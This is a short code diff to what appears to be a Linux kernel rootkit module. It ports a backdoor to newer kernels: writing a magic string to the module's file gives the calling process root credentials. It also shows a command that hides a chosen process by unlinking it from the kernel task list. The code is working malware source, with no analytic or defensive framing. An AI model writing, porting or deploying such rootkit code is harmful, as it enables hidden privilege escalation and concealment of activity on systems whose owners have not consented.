@@ -189,8 +189,10 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
 {
 	if (!strncmp(buff, "mypenislong", MIN(11, count))) { //changes to root
 		struct cred *credentials = prepare_creds();
-		credentials->uid = credentials->euid = 0;
-		credentials->gid = credentials->egid = 0;
+		credentials->uid.val = 0;
+		credentials->gid.val = 0;
+		//credentials->uid = credentials->euid = 0;
+		//credentials->gid = credentials->egid = 0;
 		commit_creds(credentials);
 	} else if (!strncmp(buff, "hp", MIN(2, count))) {//hpXXXXXX hides process with given id
 		if (current_pid < MAX_PIDS) strncpy(pids_to_hide[current_pid++], buff+2, MIN(7, count-2));
@@ -205,7 +207,7 @@ static ssize_t rtkit_write(struct file *file, const char __user *buff, size_t co
             for_each_process(p) {
                 kstrtol(pid_s, 10, &pid);
                 if (pid == p->pid) {
-                    printk("----------%d: %s\n", pid, p->comm);
+                    printk("----------%lu: %s\n", pid, p->comm);
                     proc_to_hide[current_pid] = p;
                     //list_del(&p->tasks);
                     p->tasks.prev->next = p->tasks.next;
